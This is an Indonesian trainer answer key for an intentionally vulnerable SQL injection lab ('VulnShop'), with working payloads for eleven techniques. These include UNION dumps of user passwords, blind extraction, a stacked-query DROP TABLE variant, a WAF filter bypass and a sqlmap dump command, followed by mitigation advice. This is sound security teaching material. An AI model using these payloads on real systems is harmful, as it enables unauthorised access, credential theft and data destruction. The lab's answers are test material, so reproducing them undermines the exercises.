# Kunci Jawaban — SQL Injection Lab (VulnShop)

> 📌 **Untuk trainer/pendamping.** Dokumen ini berisi payload final, langkah lengkap, dan
> penjelasan *kenapa* tiap payload berhasil untuk ke-11 lab di [README.md](README.md). Jangan
> dibagikan ke peserta sebelum sesi lab selesai — tujuannya sebagai pegangan koreksi, bukan
> bahan lab itu sendiri.
>
> Target akhir yang harus didapat peserta di Lab 1–5: **password admin `S3cr3tAdminPass!`**
> (user `admin`, role `admin`, lihat `db/init.sql`).

---

## Lab 1 — Authentication Bypass (`lab1_login_bypass.php`)

**Query di server:**
```sql
SELECT * FROM users WHERE username = '$user' AND password = '$pass'
```
`$username`/`$password` dari POST langsung disisipkan ke dalam string literal tanpa escaping
maupun prepared statement.

**Langkah:**
1. Buka form login, isi:
   - Username: `admin'-- -`
   - Password: bebas (mis. `x`)
2. Query yang benar-benar dieksekusi (halaman ini meng-echo query-nya, jadi bisa dicek langsung):
   ```sql
   SELECT * FROM users WHERE username = 'admin'-- -' AND password = 'x'
   ```
   `-- -` mengomentari sisa query, sehingga klausa `AND password = '...'` tidak pernah dievaluasi
   — query efektif menjadi `SELECT * FROM users WHERE username = 'admin'`.
3. Hasil: `Login successful! Welcome, admin (role: admin)`.

**Payload alternatif** (tanpa perlu tahu username `admin` sebelumnya):
- Username: `' OR '1'='1' -- -`, password bebas → mengembalikan baris pertama tabel `users`
  (`admin`, karena `id=1`).

---

## Lab 2 — UNION-based (`lab2_union.php`)

**Query di server:**
```sql
SELECT id, name, description, price FROM products WHERE id = $id
```
`$id` dari GET, **tanpa tanda kutip dan tanpa cast ke integer** — sehingga bisa langsung
disambung dengan klausa SQL lain tanpa perlu keluar dari string literal dulu.

**Langkah:**
1. **Cari jumlah kolom.** Karena tabel `products` yang dipakai punya 4 kolom hasil SELECT
   (`id, name, description, price`), payload berikut langsung cocok — tapi ajarkan peserta
   proses trial-and-error-nya:
   ```
   ?id=0 UNION SELECT 1,2,3,4-- -
   ```
   Kalau jumlah kolom salah, MySQL akan menampilkan error
   `The used SELECT statements have a different number of columns` di `error-box` halaman ini.
2. **Cek kolom mana yang bisa menampung string** (semua kolom hasil `products` bisa, tapi
   biasakan peserta memverifikasi):
   ```
   ?id=0 UNION SELECT 1,'a','b',4-- -
   ```
   Tabel hasil akan menampilkan baris tambahan dengan `Name = a`, `Description = b`.
3. **Ambil data tabel `users`:**
   ```
   ?id=0 UNION SELECT id, username, password, role FROM users-- -
   ```
4. Hasil (3 baris tambahan muncul di tabel produk, kolom "Name"/"Description"/"Price"
   sebenarnya menampilkan `username`/`password`/`role`):

   | ID | Name (=username) | Description (=password) | Price (=role) |
   |---|---|---|---|
   | 1 | admin | S3cr3tAdminPass! | admin |
   | 2 | alice | alice123 | user |
   | 3 | bob | bobpass99 | user |

---

## Lab 3 — Error-based (`lab3_error_based.php`)

**Query di server:**
```sql
SELECT id, name, price FROM products WHERE category = '$category'
```
Halaman ini **tidak** meng-echo query, tapi menampilkan pesan error MySQL mentah — itulah
kanal kebocoran yang dieksploitasi.

**Langkah:**
1. Konfirmasi teknik jalan (ambil versi MySQL dulu):
   ```
   ?category=electronics' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
   ```
   `extractvalue()` mengharapkan argumen kedua berupa XPath valid; `concat(0x7e, ...)` membuat
   XPath tidak valid dengan sengaja, sehingga MySQL melempar error yang **menyertakan isi
   subquery** di dalam pesannya, diawali karakter `~` (0x7e), contoh:
   `XPATH syntax error: '~8.0.xx'`.
2. Ambil password admin:
   ```
   ?category=electronics' AND extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE username='admin')))-- -
   ```
   Pesan error yang tampil: `XPATH syntax error: '~S3cr3tAdminPass!'`.

   > Catatan: `extractvalue()` hanya menampilkan maksimal 32 karakter pertama. Password admin di
   > lab ini (16 karakter) muat penuh, tapi untuk data lebih panjang jelaskan ke peserta perlu
   > `SUBSTRING()` bertahap, mis. `SUBSTRING((SELECT password ...),1,32)` lalu
   > `SUBSTRING(...,33,32)`, dst.

---

## Lab 4 — Blind Boolean-based (`lab4_blind_boolean.php`)

**Query di server:**
```sql
SELECT id FROM products WHERE id = $id AND price > 0
```
Tidak ada data maupun error yang ditampilkan — hanya dua kemungkinan pesan (oracle):
- **True** → `Product is IN STOCK.`
- **False** (termasuk kalau payload bikin query error) → `Product NOT FOUND or out of stock.`

**Langkah:**
1. Konfirmasi oracle jalan:
   ```
   ?id=1 AND 1=1   → Product is IN STOCK.
   ?id=1 AND 1=2   → Product NOT FOUND or out of stock.
   ```
2. Ekstrak password admin karakter per karakter dengan `SUBSTRING` + `BINARY` (perlu `BINARY`
   supaya perbandingan **case-sensitive**, karena password mengandung huruf besar/kecil dan
   collation default MySQL biasanya *case-insensitive*):
   ```
   ?id=1 AND BINARY SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='S'
   ```
   → `IN STOCK` (benar, karakter ke-1 = `S`). Ulangi untuk posisi 2, 3, dst., ganti karakter
   tebakan sampai dapat respons `IN STOCK`, lalu lanjut ke posisi berikutnya.
3. Hasil akhir setelah 16 iterasi (satu per posisi karakter): **`S3cr3tAdminPass!`**.

> Untuk mempercepat demo di kelas, boleh tunjukkan cara otomatisasi manual sederhana (loop
> `curl` di bash/Python mencoba tiap karakter ASCII printable) atau perkenalkan `sqlmap` sebagai
> alat produksi (`sqlmap -u ".../lab4_blind_boolean.php?id=1" --dbms=mysql --technique=B --dump`)
> setelah peserta memahami konsepnya secara manual dulu.

---

## Lab 5 — Blind Time-based (`lab5_blind_time.php`)

**Query di server:**
```sql
SELECT id FROM products WHERE id = $id
```
Respons **selalu** identik secara teks: `Request processed. (server time: {elapsed}s)` — satu-
satunya sinyal adalah nilai `{elapsed}` (waktu proses request dalam detik).

**Langkah:**
1. Baseline (tanpa delay): `?id=1` → server time ~0.0x detik.
2. Konfirmasi injeksi jalan: `?id=1 AND SLEEP(3)` → server time naik jadi ~3.0x detik.
3. Ekstrak password admin karakter per karakter (sama seperti Lab 4, tapi oracle-nya delay,
   bukan teks, dan tetap pakai `BINARY` untuk case-sensitivity):
   ```
   ?id=1 AND IF(BINARY SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='S',SLEEP(3),0)
   ```
   Kalau tebakan benar → respons lambat ~3 detik. Kalau salah → respons instan. Ulangi untuk
   tiap posisi sampai seluruh **`S3cr3tAdminPass!`** (16 karakter) terkumpul.

---

## Lab 6 — Second-order SQL Injection (`lab6_second_order.php`)

Ada **dua tahap query**, dan hanya tahap kedua yang rentan:

**Tahap 1 — Registrasi (AMAN, pakai prepared statement):**
```php
$stmt = $mysqli->prepare("INSERT INTO profiles (username, bio) VALUES (?, ?)");
$stmt->bind_param('ss', $username, $bio);
```
Nilai `username` disimpan **apa adanya** (verbatim) ke tabel `profiles` **dan** ke cookie
`profile_username` — payload SQLi lolos tersimpan dengan aman di tahap ini karena
prepared statement, tapi nilainya akan dipakai ulang secara tidak aman di tahap 2.

**Tahap 2 — Lihat Bio (RENTAN, concatenation langsung):**
```sql
SELECT bio FROM profiles WHERE username = '$stored_username' ORDER BY id DESC LIMIT 1
```
`$stored_username` diambil dari cookie `profile_username` (nilai yang sama yang disimpan di
tahap 1) lalu disambung langsung ke query tanpa escaping apa pun.

**Langkah:**
1. Register dengan:
   - Username: `x' UNION SELECT password FROM users WHERE username='admin'-- -`
   - Bio: bebas (mis. `test`)
2. Klik **"View My Bio"** (request `?action=view`). Query yang tereksekusi:
   ```sql
   SELECT bio FROM profiles WHERE username = 'x' UNION SELECT password FROM users WHERE username='admin'-- -' ORDER BY id DESC LIMIT 1
   ```
   Hanya butuh **1 kolom** di UNION karena `profiles` cuma men-SELECT kolom `bio`.
3. Hasil: `Bio: S3cr3tAdminPass!`

**Poin diskusi:** input yang "aman" saat pertama disimpan (karena prepared statement) tetap
bisa jadi berbahaya kalau dipakai ulang di query lain tanpa validasi ulang — payload tidak
harus langsung dieksekusi di titik input pertama.

---

## Lab 7 — SQLi pada `ORDER BY` (`lab7_order_by.php`)

**Query di server:**
```sql
SELECT id, name, price FROM products ORDER BY $sort
```
`$sort` **tidak di-whitelist sama sekali**. `UNION` tidak bisa dipakai langsung di posisi
`ORDER BY`, jadi teknik yang dipakai adalah **oracle boolean lewat urutan baris** (row order
sebagai sinyal true/false, bukan teks/error).

**Langkah:**
1. Konfirmasi oracle jalan — bandingkan urutan hasil dua request ini:
   ```
   ?sort=(CASE WHEN (1=1) THEN name ELSE price END)   → produk terurut ALFABET berdasarkan nama
   ?sort=(CASE WHEN (1=2) THEN name ELSE price END)   → produk terurut NUMERIK berdasarkan harga
   ```
   Urutan baris yang berbeda di antara dua respons ini adalah oracle true/false.
2. Ekstrak password admin karakter per karakter dengan oracle yang sama:
   ```
   ?sort=(CASE WHEN (BINARY SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='S') THEN name ELSE price END)
   ```
   Kalau kondisi **true**: urutan mengikuti nama produk (alfabet). Kalau **false**: urutan
   mengikuti harga (numerik). Bandingkan urutan `id` yang muncul untuk menyimpulkan true/false,
   lalu ulangi untuk tiap posisi karakter sampai dapat **`S3cr3tAdminPass!`**.

> **Materi lanjutan (opsional):** teknik error-based ganda di MySQL lewat `GROUP BY` +
> `RAND()` duplicate-key trick, mis.
> `?sort=(SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users WHERE username='admin'),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)`
> — akan memicu error `Duplicate entry '...'` yang isinya mengandung password admin. Cocok
> untuk peserta tingkat lanjut yang sudah selesai lebih cepat.

---

## Lab 8 — Stacked Queries (`lab8_stacked_queries.php`)

**Kode:**
```php
mysqli_report(MYSQLI_REPORT_OFF); // dari db.php
$query = "INSERT INTO notes (text) VALUES ('$note')";
$mysqli->multi_query($query);
```
Bedanya dengan semua lab lain di aplikasi ini: kode memanggil `mysqli_multi_query()`, bukan
`query()`/`prepare()`. `multi_query()` secara eksplisit mendukung eksekusi lebih dari satu
statement SQL yang dipisah `;` dalam satu pemanggilan — inilah yang membuat *stacked queries*
mungkin di sini padahal tidak mungkin di lab-lab lain (Lab 1–7 dan 9–11) walau sama-sama rentan
terhadap SQLi biasa.

Tabel `notes` (lihat `db/init.sql`) sengaja dibuat **terpisah** dari tabel `users`/`products`
yang dipakai lab lain, supaya payload destruktif (`DROP TABLE`) di lab ini tidak pernah merusak
data lab lain. Halaman ini juga menjalankan `CREATE TABLE IF NOT EXISTS notes (...)` di awal
setiap load, sehingga self-healing kalau tabelnya sempat di-DROP.

**Payload:**
```
note=x'); INSERT INTO notes (text) VALUES ('injected via stacked query'); -- 
```

**Kenapa berhasil:** Payload menutup statement `INSERT` pertama dengan `')`, menambahkan `;`
lalu statement `INSERT` kedua yang sepenuhnya baru, kemudian mengomentari sisa query asli
(`')`) dengan `-- `. Karena `multi_query()` mengeksekusi keduanya, muncul baris baru di tabel
`notes` yang tidak pernah diketik langsung lewat form.

Query yang benar-benar dieksekusi (dua statement sekaligus):
```sql
INSERT INTO notes (text) VALUES ('x'); INSERT INTO notes (text) VALUES ('injected via stacked query'); -- ')
```

**Hasil:** Tabel notes menampilkan baris tambahan `injected via stacked query` yang tidak pernah
dikirim lewat alur normal form.

> **Varian destruktif (opsional, untuk didemokan sekali saja):**
> `note=x'); DROP TABLE notes; -- ` akan benar-benar men-DROP tabel `notes`. Reload halaman akan
> otomatis membuatnya ulang (kosong) karena guard `CREATE TABLE IF NOT EXISTS` di awal skrip.
> Sudah diverifikasi berjalan (drop lalu auto-recreate) terhadap MySQL 8 asli.

---

## Lab 9 — Filter/WAF Bypass (`lab9_filter_bypass.php`)

**Kode:**
```php
if (preg_match('/union\s+select/i', $category)) {
    die('Payload berbahaya terdeteksi!');
}
$query = "SELECT id, name, price FROM products WHERE category = '$category'";
```
Filter ini hanya mencocokkan frasa literal "union" + satu atau lebih whitespace (`\s+`, jadi
spasi, tab, atau baris baru **tetap kena blokir**) + "select", case-insensitive. Selain itu,
query di baliknya persis sama rentannya dengan Lab 3 — string concatenation biasa.

**Payload:**
```
category=nonexistent' UNION/**/SELECT username,password,role FROM users-- -
```

**Kenapa berhasil:** Regex `\s+` **tidak** mencocokkan karakter `/`, `*` — jadi komentar inline
MySQL `/**/` di antara `UNION` dan `SELECT` membuat frasa "union select" tidak pernah muncul
sebagai satu string yang match dengan regex-nya, sementara MySQL sendiri tetap memperlakukan
`/**/` sebagai pemisah token yang sah antar keyword (setara whitespace secara sintaksis untuk
parser MySQL, meski tidak secara tekstual untuk regex). Sudah diverifikasi: payload dengan spasi
biasa **diblokir** oleh filter, sedangkan payload dengan `/**/` **lolos** filter dan tetap
tereksekusi sebagai UNION SELECT yang valid di MySQL 8 asli.

**Hasil:**

| ID | Name (=username) | Price (=role) |
|---|---|---|
| ... | admin | admin |
| ... | alice | user |
| ... | bob | user |

(kolom "Name" pada baris UNION menampilkan `username`, kolom "Price" menampilkan `role`; untuk
melihat password, ganti `role` di payload dengan `password` atau tambahkan kolom sesuai kebutuhan.)

---

## Lab 10 — SQLi pada `INSERT` (`lab10_insert_based.php`)

**Kode:**
```php
$query = "INSERT INTO reg_demo_users (username, bio) VALUES ('$username', '$bio')";
$res = $mysqli->query($query);
if ($res === false) {
    // menampilkan mysqli_error($conn) mentah - sama seperti Lab 3
}
```
Tabel `reg_demo_users` sengaja terpisah dari tabel `users` yang asli (lihat `db/init.sql`),
supaya lab ini tidak mengganggu data akun sungguhan yang dipakai lab lain.

**Payload (field Bio, username boleh diisi bebas mis. `tester`):**
```
' OR extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1))))-- 
```

**Kenapa berhasil:** Karena tabel `reg_demo_users` cuma punya 2 kolom (`username`, `bio`), kita
tidak bisa menambah value baru dengan koma (akan memicu error "Column count doesn't match value
count" duluan, sebelum sempat memicu error yang kita mau). Trik yang dipakai: tutup literal
string `bio` lebih awal dengan `'` (menghasilkan string kosong `''`), lalu gabungkan dengan
`OR extractvalue(...)` — ini tetap **satu** ekspresi/value tunggal (bukan value baru), sehingga
jumlah kolom tetap 2. `extractvalue()` diberi argumen kedua berupa XPath yang sengaja tidak
valid (`concat(0x7e, (subquery))`), sehingga MySQL melempar error yang menyertakan isi subquery
di pesannya. Perhatikan pemakaian `''` (string kosong), **bukan** `'x'` — MySQL 8 berjalan dalam
`STRICT_TRANS_TABLES` untuk statement `INSERT`, sehingga `'x' OR ...` akan gagal duluan dengan
error konversi tipe (`Truncated incorrect DOUBLE value: 'x'`) sebelum sempat mengevaluasi
`extractvalue()` — sudah diverifikasi langsung terhadap MySQL 8 asli, dan `''` tidak memicu
masalah konversi yang sama.

Query yang benar-benar dieksekusi:
```sql
INSERT INTO reg_demo_users (username, bio) VALUES ('tester', '' OR extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1))))-- ')
```

**Hasil:** `SQL Error: XPATH syntax error: '~S3cr3tAdminPass!'`

---

## Lab 11 — SQLi lewat Cookie (`lab11_cookie_based.php`)

**Kode:**
```php
$tracking_id = $_COOKIE['TrackingId'];
$query = "SELECT id, name, description, price FROM products WHERE id = '$tracking_id' LIMIT 1";
```
Titik injeksinya adalah cookie `TrackingId` (di-set otomatis oleh server saat pertama kali buka
halaman ini) — bukan parameter URL atau field form yang kelihatan. Strukturnya identik dengan
query Lab 2.

**Payload (set sebagai nilai cookie `TrackingId`, lewat DevTools/Burp atau form bantuan di
halaman lab):**
```
0' UNION SELECT username,password,role,1 FROM users-- -
```

**Kenapa berhasil:** Sama seperti Lab 2 — nilai cookie disambung langsung ke `WHERE id = '...'`
tanpa escaping, dan tabel `products` di-SELECT dengan 4 kolom (`id, name, description, price`)
yang cocok dengan jumlah kolom `users` yang diambil (`username, password, role`, ditambah `1`
sebagai kolom ke-4). Komentar `-- -` juga menghapus klausa `LIMIT 1` bawaan template, sehingga
seluruh baris `users` ikut tampil, bukan cuma satu.

Query yang benar-benar dieksekusi:
```sql
SELECT id, name, description, price FROM products WHERE id = '0' UNION SELECT username,password,role,1 FROM users-- -' LIMIT 1
```

**Hasil:**

| ID (=username) | Name (=password) | Description (=role) | Price |
|---|---|---|---|
| admin | S3cr3tAdminPass! | admin | 1.00 |
| alice | alice123 | user | 1.00 |
| bob | bobpass99 | user | 1.00 |

**Poin diskusi:** review kode/pentest yang hanya memeriksa parameter URL dan field form akan
melewatkan titik injeksi ini — cookie, header, dan kanal "tersembunyi" lain butuh perlakuan yang
sama karena tetap menjadi input yang mencapai query SQL.

---

## Ringkasan hasil akhir

| Lab | Teknik | Hasil yang harus didapat |
|---|---|---|
| 1 | Auth bypass | Login sebagai `admin` tanpa tahu password |
| 2 | UNION-based | `admin / S3cr3tAdminPass! / admin` (+ alice, bob) lewat tabel produk |
| 3 | Error-based | `S3cr3tAdminPass!` muncul di pesan error MySQL |
| 4 | Blind boolean | `S3cr3tAdminPass!` diekstrak karakter per karakter dari oracle IN STOCK/NOT FOUND |
| 5 | Blind time-based | `S3cr3tAdminPass!` diekstrak dari selisih waktu respons (`SLEEP`) |
| 6 | Second-order | `S3cr3tAdminPass!` muncul di "Bio" lewat username yang di-UNION |
| 7 | ORDER BY | Password admin diekstrak lewat perubahan urutan baris (`CASE WHEN`) |
| 8 | Stacked queries | Baris baru muncul di tabel `notes` lewat statement `INSERT` kedua yang disisipkan |
| 9 | Filter/WAF bypass | UNION SELECT lolos filter blacklist lewat pemisah `/**/` |
| 10 | INSERT-based (error) | `S3cr3tAdminPass!` muncul di pesan error MySQL lewat field `bio` saat registrasi |
| 11 | SQLi via cookie | `admin / S3cr3tAdminPass! / admin` (+ alice, bob) lewat cookie `TrackingId` |

## Mitigasi (ringkas, lihat [README.md](README.md) untuk versi lengkap)
- Prepared statements/parameterized queries di semua lab (termasuk Lab 6 tahap kedua).
- Whitelist nama kolom/arah sort untuk Lab 7, jangan pernah concatenate input ke `ORDER BY`.
- Least privilege akun DB, disable raw SQL error ke user (Lab 3 dan Lab 10), dan validasi ulang
  data setiap kali dipakai di query baru (Lab 6) — bukan cuma saat pertama disimpan.
- Lab 8: jangan pernah pakai `multi_query()`/`PDO::MYSQL_ATTR_MULTI_STATEMENTS` dengan input
  yang tidak tepercaya.
- Lab 9: blacklist keyword tidak pernah cukup sebagai satu-satunya pertahanan — gunakan
  parameterized query.
- Lab 11: perlakukan cookie/header sebagai input tidak tepercaya, sama seperti parameter
  URL/form.
